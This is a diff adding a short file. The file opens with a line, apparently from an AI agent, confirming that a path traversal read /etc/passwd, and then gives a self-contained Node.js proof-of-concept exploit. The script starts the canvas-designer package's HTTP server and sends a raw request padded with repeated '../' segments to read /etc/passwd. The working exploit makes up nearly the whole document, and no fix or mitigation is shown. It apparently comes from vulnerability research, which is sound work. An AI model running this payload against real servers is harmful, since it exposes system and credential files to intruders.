@@ -1,0 +1,36 @@
+Confirmed: path traversal works, successfully reading `/etc/passwd`. Now producing the final self-contained exploit snippet.
+
+```javascript
+'use strict';
+
+const net = require('net');
+
+// Requiring the package immediately starts its HTTP server (server.js is
+// the package "main"), whose request handler builds the file path from the
+// unsanitized `uri` = url.parse(request.url).pathname.
+require('./node_modules/canvas-designer');
+
+const PORT = process.env.PORT || 9001;
+
+// Enough "../" segments to walk out of process.cwd() all the way to
+// filesystem root, regardless of how deep the cwd is nested.
+const payload = '/' + '../'.repeat(20) + 'etc/passwd';
+
+setTimeout(() => {
+  const socket = net.connect(PORT, '127.0.0.1', () => {
+    socket.write(
+      'GET ' + payload + ' HTTP/1.1\r\n' +
+      'Host: localhost\r\n' +
+      'Connection: close\r\n\r\n'
+    );
+  });
+
+  let data = '';
+  socket.on('data', chunk => (data += chunk));
+  socket.on('end', () => {
+    console.log('--- Response from server ---');
+    console.log(data);
+    process.exit(0);
+  });
+}, 500);
+```
